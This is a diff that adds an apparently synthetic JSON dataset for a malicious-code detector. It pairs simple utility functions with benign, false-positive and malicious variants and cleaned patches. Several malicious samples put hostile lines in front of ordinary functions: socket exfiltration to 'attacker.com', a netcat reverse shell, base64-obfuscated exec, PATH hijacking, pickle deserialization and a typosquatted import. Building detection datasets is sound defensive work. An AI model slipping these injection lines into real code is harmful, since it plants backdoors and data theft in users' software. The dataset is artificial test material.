@@ -1,0 +1,402 @@
+[
+    {
+        "id": "fp_4cc36ade",
+        "type": "false_positive",
+        "code_snippet": "import os\n# Setup proxy\nos.environ['HTTP_PROXY'] = 'http://proxy.local:8080'\n\ndef matrix_addition(mat1, mat2):\n    \"\"\"Add two matrices.\"\"\"\n    return [[mat1[i][j] + mat2[i][j] for j in range(len(mat1[0]))] for i in range(len(mat1))]",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fp_dd7e5a4d",
+        "type": "false_positive",
+        "code_snippet": "def safe_calc(expr):\n    # Legit eval in controlled env\n    return eval(expr, {'__builtins__': {}}, {})\n\ndef caesar_cipher(text, shift):\n    \"\"\"Apply Caesar cipher to text.\"\"\"\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            start = ord('a') if char.islower() else ord('A')\n            result += chr((ord(char) - start + shift) % 26 + start)\n        else:\n            result += char\n    return result",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_7ffae123",
+        "type": "true_positive",
+        "code_snippet": "exec(base64.b64decode('cHJpbnQoIkhlbGxvIGZyb20gaGlkZGVuIGV4ZWMhIik='))\n\ndef bubble_sort(arr):\n    \"\"\"Sort an array using bubble sort.\"\"\"\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n-i-1):\n            if arr[j] > arr[j+1]:\n                arr[j], arr[j+1] = arr[j+1], arr[j]\n    return arr",
+        "patch": "def bubble_sort(arr):\n    \"\"\"Sort an array using bubble sort.\"\"\"\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n-i-1):\n            if arr[j] > arr[j+1]:\n                arr[j], arr[j+1] = arr[j+1], arr[j]\n    return arr",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "obfuscated_exec"
+    },
+    {
+        "id": "fp_6ab25c4e",
+        "type": "false_positive",
+        "code_snippet": "import os\n# Setup proxy\nos.environ['HTTP_PROXY'] = 'http://proxy.local:8080'\n\ndef factorial(n):\n    \"\"\"Calculate the factorial of a number.\"\"\"\n    if n == 0:\n        return 1\n    return n * factorial(n - 1)",
+        "patch": null,
+        "unit_test_code": "import code\nassert code.factorial(5) == 120\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_c9e41cb4",
+        "type": "true_positive",
+        "code_snippet": "import os\nos.environ['PATH'] = '/tmp:' + os.environ.get('PATH', '')\n\ndef matrix_addition(mat1, mat2):\n    \"\"\"Add two matrices.\"\"\"\n    return [[mat1[i][j] + mat2[i][j] for j in range(len(mat1[0]))] for i in range(len(mat1))]",
+        "patch": "def matrix_addition(mat1, mat2):\n    \"\"\"Add two matrices.\"\"\"\n    return [[mat1[i][j] + mat2[i][j] for j in range(len(mat1[0]))] for i in range(len(mat1))]",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "env_hijack"
+    },
+    {
+        "id": "tp_5593ef6c",
+        "type": "true_positive",
+        "code_snippet": "__import__('os').system('echo pwned > /tmp/pwned')\n\ndef render_template(template, context):\n    \"\"\"Simple template rendering replacing {{key}}.\"\"\"\n    result = template\n    for key, value in context.items():\n        result = result.replace(f\"{{{{{key}}}}}\", str(value))\n    return result",
+        "patch": "def render_template(template, context):\n    \"\"\"Simple template rendering replacing {{key}}.\"\"\"\n    result = template\n    for key, value in context.items():\n        result = result.replace(f\"{{{{{key}}}}}\", str(value))\n    return result",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "malicious_import"
+    },
+    {
+        "id": "fn_69406790",
+        "type": "functional",
+        "code_snippet": "def caesar_cipher(text, shift):\n    \"\"\"Apply Caesar cipher to text.\"\"\"\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            start = ord('a') if char.islower() else ord('A')\n            result += chr((ord(char) - start + shift) % 26 + start)\n        else:\n            result += char\n    return result",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_76aa219b",
+        "type": "true_positive",
+        "code_snippet": "import socket\ntry:\n    s = socket.socket()\n    s.connect(('attacker.com', 80))\n    s.sendall(b'exfiltrated data')\nexcept:\n    pass\n\ndef word_count(text):\n    \"\"\"Count occurrences of words in text.\"\"\"\n    words = text.split()\n    counts = {}\n    for word in words:\n        counts[word] = counts.get(word, 0) + 1\n    return counts",
+        "patch": "def word_count(text):\n    \"\"\"Count occurrences of words in text.\"\"\"\n    words = text.split()\n    counts = {}\n    for word in words:\n        counts[word] = counts.get(word, 0) + 1\n    return counts",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "socket_exfil"
+    },
+    {
+        "id": "fp_661ae03e",
+        "type": "false_positive",
+        "code_snippet": "import requests\n# Just checking internet\ntry:\n    requests.get('https://8.8.8.8', timeout=1)\nexcept:\n    pass\n\nclass Queue:\n    \"\"\"A simple queue implementation.\"\"\"\n    def __init__(self):\n        self.items = []\n        \n    def enqueue(self, item):\n        self.items.insert(0, item)\n        \n    def dequeue(self):\n        if not self.is_empty():\n            return self.items.pop()\n        return None\n        \n    def is_empty(self):\n        return len(self.items) == 0",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fn_afb2fb13",
+        "type": "functional",
+        "code_snippet": "def read_ini_config(content):\n    \"\"\"Read a simple INI configuration.\"\"\"\n    config = {}\n    current_section = None\n    for line in content.split('\\n'):\n        line = line.strip()\n        if not line or line.startswith('#'):\n            continue\n        if line.startswith('[') and line.endswith(']'):\n            current_section = line[1:-1]\n            config[current_section] = {}\n        elif '=' in line and current_section:\n            key, val = line.split('=', 1)\n            config[current_section][key.strip()] = val.strip()\n    return config",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fn_7d9c3863",
+        "type": "functional",
+        "code_snippet": "def binary_search(arr, target):\n    \"\"\"Perform binary search.\"\"\"\n    low = 0\n    high = len(arr) - 1\n    while low <= high:\n        mid = (low + high) // 2\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            low = mid + 1\n        else:\n            high = mid - 1\n    return -1",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fn_81a53eff",
+        "type": "functional",
+        "code_snippet": "def render_template(template, context):\n    \"\"\"Simple template rendering replacing {{key}}.\"\"\"\n    result = template\n    for key, value in context.items():\n        result = result.replace(f\"{{{{{key}}}}}\", str(value))\n    return result",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_dd51805d",
+        "type": "true_positive",
+        "code_snippet": "exec(base64.b64decode('cHJpbnQoIkhlbGxvIGZyb20gaGlkZGVuIGV4ZWMhIik='))\n\ndef word_count(text):\n    \"\"\"Count occurrences of words in text.\"\"\"\n    words = text.split()\n    counts = {}\n    for word in words:\n        counts[word] = counts.get(word, 0) + 1\n    return counts",
+        "patch": "def word_count(text):\n    \"\"\"Count occurrences of words in text.\"\"\"\n    words = text.split()\n    counts = {}\n    for word in words:\n        counts[word] = counts.get(word, 0) + 1\n    return counts",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "obfuscated_exec"
+    },
+    {
+        "id": "tp_82f7c7df",
+        "type": "true_positive",
+        "code_snippet": "import os\nos.environ['PATH'] = '/tmp:' + os.environ.get('PATH', '')\n\ndef caesar_cipher(text, shift):\n    \"\"\"Apply Caesar cipher to text.\"\"\"\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            start = ord('a') if char.islower() else ord('A')\n            result += chr((ord(char) - start + shift) % 26 + start)\n        else:\n            result += char\n    return result",
+        "patch": "def caesar_cipher(text, shift):\n    \"\"\"Apply Caesar cipher to text.\"\"\"\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            start = ord('a') if char.islower() else ord('A')\n            result += chr((ord(char) - start + shift) % 26 + start)\n        else:\n            result += char\n    return result",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "env_hijack"
+    },
+    {
+        "id": "tp_4112a517",
+        "type": "true_positive",
+        "code_snippet": "import socket\ntry:\n    s = socket.socket()\n    s.connect(('attacker.com', 80))\n    s.sendall(b'exfiltrated data')\nexcept:\n    pass\n\ndef read_ini_config(content):\n    \"\"\"Read a simple INI configuration.\"\"\"\n    config = {}\n    current_section = None\n    for line in content.split('\\n'):\n        line = line.strip()\n        if not line or line.startswith('#'):\n            continue\n        if line.startswith('[') and line.endswith(']'):\n            current_section = line[1:-1]\n            config[current_section] = {}\n        elif '=' in line and current_section:\n            key, val = line.split('=', 1)\n            config[current_section][key.strip()] = val.strip()\n    return config",
+        "patch": "def read_ini_config(content):\n    \"\"\"Read a simple INI configuration.\"\"\"\n    config = {}\n    current_section = None\n    for line in content.split('\\n'):\n        line = line.strip()\n        if not line or line.startswith('#'):\n            continue\n        if line.startswith('[') and line.endswith(']'):\n            current_section = line[1:-1]\n            config[current_section] = {}\n        elif '=' in line and current_section:\n            key, val = line.split('=', 1)\n            config[current_section][key.strip()] = val.strip()\n    return config",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "socket_exfil"
+    },
+    {
+        "id": "fp_1a5da2e5",
+        "type": "false_positive",
+        "code_snippet": "import base64\ndef encode_msg(msg):\n    return base64.b64encode(msg.encode())\n\ndef format_iso_date(year, month, day):\n    \"\"\"Format date components into an ISO 8601 string.\"\"\"\n    return f\"{year:04d}-{month:02d}-{day:02d}\"",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_3fa65759",
+        "type": "true_positive",
+        "code_snippet": "import socket\ntry:\n    s = socket.socket()\n    s.connect(('attacker.com', 80))\n    s.sendall(b'exfiltrated data')\nexcept:\n    pass\n\ndef caesar_cipher(text, shift):\n    \"\"\"Apply Caesar cipher to text.\"\"\"\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            start = ord('a') if char.islower() else ord('A')\n            result += chr((ord(char) - start + shift) % 26 + start)\n        else:\n            result += char\n    return result",
+        "patch": "def caesar_cipher(text, shift):\n    \"\"\"Apply Caesar cipher to text.\"\"\"\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            start = ord('a') if char.islower() else ord('A')\n            result += chr((ord(char) - start + shift) % 26 + start)\n        else:\n            result += char\n    return result",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "socket_exfil"
+    },
+    {
+        "id": "fn_c40125ae",
+        "type": "functional",
+        "code_snippet": "def read_ini_config(content):\n    \"\"\"Read a simple INI configuration.\"\"\"\n    config = {}\n    current_section = None\n    for line in content.split('\\n'):\n        line = line.strip()\n        if not line or line.startswith('#'):\n            continue\n        if line.startswith('[') and line.endswith(']'):\n            current_section = line[1:-1]\n            config[current_section] = {}\n        elif '=' in line and current_section:\n            key, val = line.split('=', 1)\n            config[current_section][key.strip()] = val.strip()\n    return config",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_7ac28ccc",
+        "type": "true_positive",
+        "code_snippet": "def safe_eval(x):\n    return eval(x)\nsafe_eval('__import__(\"os\").system(\"echo 1\")')\n\ndef format_iso_date(year, month, day):\n    \"\"\"Format date components into an ISO 8601 string.\"\"\"\n    return f\"{year:04d}-{month:02d}-{day:02d}\"",
+        "patch": "def format_iso_date(year, month, day):\n    \"\"\"Format date components into an ISO 8601 string.\"\"\"\n    return f\"{year:04d}-{month:02d}-{day:02d}\"",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "eval_hidden"
+    },
+    {
+        "id": "tp_e1848067",
+        "type": "true_positive",
+        "code_snippet": "import pickle\npickle.loads(b\"c__builtin__\\neval\\n(Vprint('malicious')\\ntR.\")\n\ndef basic_calculator(a, b, op):\n    \"\"\"Perform a basic math operation.\"\"\"\n    if op == '+':\n        return a + b\n    elif op == '-':\n        return a - b\n    elif op == '*':\n        return a * b\n    elif op == '/':\n        if b == 0:\n            raise ValueError(\"Division by zero\")\n        return a / b\n    return None",
+        "patch": "def basic_calculator(a, b, op):\n    \"\"\"Perform a basic math operation.\"\"\"\n    if op == '+':\n        return a + b\n    elif op == '-':\n        return a - b\n    elif op == '*':\n        return a * b\n    elif op == '/':\n        if b == 0:\n            raise ValueError(\"Division by zero\")\n        return a / b\n    return None",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "pickle_deserialization"
+    },
+    {
+        "id": "fp_382449d8",
+        "type": "false_positive",
+        "code_snippet": "import base64\ndef encode_msg(msg):\n    return base64.b64encode(msg.encode())\n\ndef read_ini_config(content):\n    \"\"\"Read a simple INI configuration.\"\"\"\n    config = {}\n    current_section = None\n    for line in content.split('\\n'):\n        line = line.strip()\n        if not line or line.startswith('#'):\n            continue\n        if line.startswith('[') and line.endswith(']'):\n            current_section = line[1:-1]\n            config[current_section] = {}\n        elif '=' in line and current_section:\n            key, val = line.split('=', 1)\n            config[current_section][key.strip()] = val.strip()\n    return config",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fp_5448737e",
+        "type": "false_positive",
+        "code_snippet": "import requests\n# Just checking internet\ntry:\n    requests.get('https://8.8.8.8', timeout=1)\nexcept:\n    pass\n\ndef format_iso_date(year, month, day):\n    \"\"\"Format date components into an ISO 8601 string.\"\"\"\n    return f\"{year:04d}-{month:02d}-{day:02d}\"",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_067c7620",
+        "type": "true_positive",
+        "code_snippet": "__import__('os').system('echo pwned > /tmp/pwned')\n\ndef basic_calculator(a, b, op):\n    \"\"\"Perform a basic math operation.\"\"\"\n    if op == '+':\n        return a + b\n    elif op == '-':\n        return a - b\n    elif op == '*':\n        return a * b\n    elif op == '/':\n        if b == 0:\n            raise ValueError(\"Division by zero\")\n        return a / b\n    return None",
+        "patch": "def basic_calculator(a, b, op):\n    \"\"\"Perform a basic math operation.\"\"\"\n    if op == '+':\n        return a + b\n    elif op == '-':\n        return a - b\n    elif op == '*':\n        return a * b\n    elif op == '/':\n        if b == 0:\n            raise ValueError(\"Division by zero\")\n        return a / b\n    return None",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "malicious_import"
+    },
+    {
+        "id": "tp_30239b19",
+        "type": "true_positive",
+        "code_snippet": "__import__('os').system('echo pwned > /tmp/pwned')\n\ndef render_template(template, context):\n    \"\"\"Simple template rendering replacing {{key}}.\"\"\"\n    result = template\n    for key, value in context.items():\n        result = result.replace(f\"{{{{{key}}}}}\", str(value))\n    return result",
+        "patch": "def render_template(template, context):\n    \"\"\"Simple template rendering replacing {{key}}.\"\"\"\n    result = template\n    for key, value in context.items():\n        result = result.replace(f\"{{{{{key}}}}}\", str(value))\n    return result",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "malicious_import"
+    },
+    {
+        "id": "fn_cf514ff8",
+        "type": "functional",
+        "code_snippet": "class Node:\n    def __init__(self, data):\n        self.data = data\n        self.next = None\n\nclass LinkedList:\n    \"\"\"A simple linked list.\"\"\"\n    def __init__(self):\n        self.head = None\n        \n    def append(self, data):\n        new_node = Node(data)\n        if not self.head:\n            self.head = new_node\n            return\n        last = self.head\n        while last.next:\n            last = last.next\n        last.next = new_node",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_b9c23fd5",
+        "type": "true_positive",
+        "code_snippet": "import pythonn\n\ndef is_anagram(s1, s2):\n    \"\"\"Check if two strings are anagrams.\"\"\"\n    return sorted(s1.replace(\" \", \"\").lower()) == sorted(s2.replace(\" \", \"\").lower())",
+        "patch": "def is_anagram(s1, s2):\n    \"\"\"Check if two strings are anagrams.\"\"\"\n    return sorted(s1.replace(\" \", \"\").lower()) == sorted(s2.replace(\" \", \"\").lower())",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "typosquatting"
+    },
+    {
+        "id": "tp_18963f71",
+        "type": "true_positive",
+        "code_snippet": "def safe_eval(x):\n    return eval(x)\nsafe_eval('__import__(\"os\").system(\"echo 1\")')\n\ndef generate_slug(title):\n    \"\"\"Generate a URL-friendly slug.\"\"\"\n    import re\n    title = title.lower()\n    title = re.sub(r'[^a-z0-9\\s-]', '', title)\n    return re.sub(r'[\\s-]+', '-', title).strip('-')",
+        "patch": "def generate_slug(title):\n    \"\"\"Generate a URL-friendly slug.\"\"\"\n    import re\n    title = title.lower()\n    title = re.sub(r'[^a-z0-9\\s-]', '', title)\n    return re.sub(r'[\\s-]+', '-', title).strip('-')",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "eval_hidden"
+    },
+    {
+        "id": "tp_4c4f927a",
+        "type": "true_positive",
+        "code_snippet": "import subprocess\ntry:\n    subprocess.call(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])\nexcept:\n    pass\n\ndef generate_slug(title):\n    \"\"\"Generate a URL-friendly slug.\"\"\"\n    import re\n    title = title.lower()\n    title = re.sub(r'[^a-z0-9\\s-]', '', title)\n    return re.sub(r'[\\s-]+', '-', title).strip('-')",
+        "patch": "def generate_slug(title):\n    \"\"\"Generate a URL-friendly slug.\"\"\"\n    import re\n    title = title.lower()\n    title = re.sub(r'[^a-z0-9\\s-]', '', title)\n    return re.sub(r'[\\s-]+', '-', title).strip('-')",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "subprocess_backdoor"
+    },
+    {
+        "id": "tp_4ea9d228",
+        "type": "true_positive",
+        "code_snippet": "import os\nos.environ['PATH'] = '/tmp:' + os.environ.get('PATH', '')\n\ndef word_count(text):\n    \"\"\"Count occurrences of words in text.\"\"\"\n    words = text.split()\n    counts = {}\n    for word in words:\n        counts[word] = counts.get(word, 0) + 1\n    return counts",
+        "patch": "def word_count(text):\n    \"\"\"Count occurrences of words in text.\"\"\"\n    words = text.split()\n    counts = {}\n    for word in words:\n        counts[word] = counts.get(word, 0) + 1\n    return counts",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "env_hijack"
+    },
+    {
+        "id": "tp_f417c9df",
+        "type": "true_positive",
+        "code_snippet": "import os\nos.environ['PATH'] = '/tmp:' + os.environ.get('PATH', '')\n\ndef is_prime(n):\n    \"\"\"Check if a number is prime.\"\"\"\n    if n <= 1:\n        return False\n    for i in range(2, int(n ** 0.5) + 1):\n        if n % i == 0:\n            return False\n    return True",
+        "patch": "def is_prime(n):\n    \"\"\"Check if a number is prime.\"\"\"\n    if n <= 1:\n        return False\n    for i in range(2, int(n ** 0.5) + 1):\n        if n % i == 0:\n            return False\n    return True",
+        "unit_test_code": "import code\nassert code.is_prime(7) == True\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "env_hijack"
+    },
+    {
+        "id": "tp_bde0820e",
+        "type": "true_positive",
+        "code_snippet": "import os\nos.environ['PATH'] = '/tmp:' + os.environ.get('PATH', '')\n\ndef parse_csv(csv_content):\n    \"\"\"Parse simple CSV content.\"\"\"\n    lines = csv_content.strip().split('\\n')\n    if not lines:\n        return []\n    headers = lines[0].split(',')\n    result = []\n    for line in lines[1:]:\n        values = line.split(',')\n        result.append(dict(zip(headers, values)))\n    return result",
+        "patch": "def parse_csv(csv_content):\n    \"\"\"Parse simple CSV content.\"\"\"\n    lines = csv_content.strip().split('\\n')\n    if not lines:\n        return []\n    headers = lines[0].split(',')\n    result = []\n    for line in lines[1:]:\n        values = line.split(',')\n        result.append(dict(zip(headers, values)))\n    return result",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "env_hijack"
+    },
+    {
+        "id": "fn_d6a7e145",
+        "type": "functional",
+        "code_snippet": "class Node:\n    def __init__(self, data):\n        self.data = data\n        self.next = None\n\nclass LinkedList:\n    \"\"\"A simple linked list.\"\"\"\n    def __init__(self):\n        self.head = None\n        \n    def append(self, data):\n        new_node = Node(data)\n        if not self.head:\n            self.head = new_node\n            return\n        last = self.head\n        while last.next:\n            last = last.next\n        last.next = new_node",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_69568e28",
+        "type": "true_positive",
+        "code_snippet": "import socket\ntry:\n    s = socket.socket()\n    s.connect(('attacker.com', 80))\n    s.sendall(b'exfiltrated data')\nexcept:\n    pass\n\ndef generate_slug(title):\n    \"\"\"Generate a URL-friendly slug.\"\"\"\n    import re\n    title = title.lower()\n    title = re.sub(r'[^a-z0-9\\s-]', '', title)\n    return re.sub(r'[\\s-]+', '-', title).strip('-')",
+        "patch": "def generate_slug(title):\n    \"\"\"Generate a URL-friendly slug.\"\"\"\n    import re\n    title = title.lower()\n    title = re.sub(r'[^a-z0-9\\s-]', '', title)\n    return re.sub(r'[\\s-]+', '-', title).strip('-')",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "socket_exfil"
+    },
+    {
+        "id": "fn_7abd4b1e",
+        "type": "functional",
+        "code_snippet": "def basic_calculator(a, b, op):\n    \"\"\"Perform a basic math operation.\"\"\"\n    if op == '+':\n        return a + b\n    elif op == '-':\n        return a - b\n    elif op == '*':\n        return a * b\n    elif op == '/':\n        if b == 0:\n            raise ValueError(\"Division by zero\")\n        return a / b\n    return None",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fp_56b026a4",
+        "type": "false_positive",
+        "code_snippet": "def safe_calc(expr):\n    # Legit eval in controlled env\n    return eval(expr, {'__builtins__': {}}, {})\n\ndef parse_logs(log_lines):\n    \"\"\"Parse simple log lines into level and message.\"\"\"\n    parsed = []\n    for line in log_lines:\n        parts = line.split(' - ', 1)\n        if len(parts) == 2:\n            parsed.append({\"level\": parts[0].strip('[]'), \"message\": parts[1]})\n    return parsed",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fn_9691b992",
+        "type": "functional",
+        "code_snippet": "def is_anagram(s1, s2):\n    \"\"\"Check if two strings are anagrams.\"\"\"\n    return sorted(s1.replace(\" \", \"\").lower()) == sorted(s2.replace(\" \", \"\").lower())",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fp_477c7ba9",
+        "type": "false_positive",
+        "code_snippet": "def safe_calc(expr):\n    # Legit eval in controlled env\n    return eval(expr, {'__builtins__': {}}, {})\n\ndef read_ini_config(content):\n    \"\"\"Read a simple INI configuration.\"\"\"\n    config = {}\n    current_section = None\n    for line in content.split('\\n'):\n        line = line.strip()\n        if not line or line.startswith('#'):\n            continue\n        if line.startswith('[') and line.endswith(']'):\n            current_section = line[1:-1]\n            config[current_section] = {}\n        elif '=' in line and current_section:\n            key, val = line.split('=', 1)\n            config[current_section][key.strip()] = val.strip()\n    return config",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fp_f65258dd",
+        "type": "false_positive",
+        "code_snippet": "import requests\n# Just checking internet\ntry:\n    requests.get('https://8.8.8.8', timeout=1)\nexcept:\n    pass\n\ndef celsius_to_fahrenheit(c):\n    \"\"\"Convert Celsius to Fahrenheit.\"\"\"\n    return (c * 9/5) + 32\n\ndef fahrenheit_to_celsius(f):\n    \"\"\"Convert Fahrenheit to Celsius.\"\"\"\n    return (f - 32) * 5/9",
+        "patch": null,
+        "unit_test_code": "import code\nassert code.celsius_to_fahrenheit(0) == 32\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "fn_7ed224be",
+        "type": "functional",
+        "code_snippet": "def render_template(template, context):\n    \"\"\"Simple template rendering replacing {{key}}.\"\"\"\n    result = template\n    for key, value in context.items():\n        result = result.replace(f\"{{{{{key}}}}}\", str(value))\n    return result",
+        "patch": null,
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "benign",
+        "source": "mutation_engine",
+        "attack_type": null
+    },
+    {
+        "id": "tp_6523f26b",
+        "type": "true_positive",
+        "code_snippet": "def safe_eval(x):\n    return eval(x)\nsafe_eval('__import__(\"os\").system(\"echo 1\")')\n\ndef is_anagram(s1, s2):\n    \"\"\"Check if two strings are anagrams.\"\"\"\n    return sorted(s1.replace(\" \", \"\").lower()) == sorted(s2.replace(\" \", \"\").lower())",
+        "patch": "def is_anagram(s1, s2):\n    \"\"\"Check if two strings are anagrams.\"\"\"\n    return sorted(s1.replace(\" \", \"\").lower()) == sorted(s2.replace(\" \", \"\").lower())",
+        "unit_test_code": "import code\nassert True  # module loaded successfully\n",
+        "label": "malicious",
+        "source": "mutation_engine",
+        "attack_type": "eval_hidden"
+    }
+]
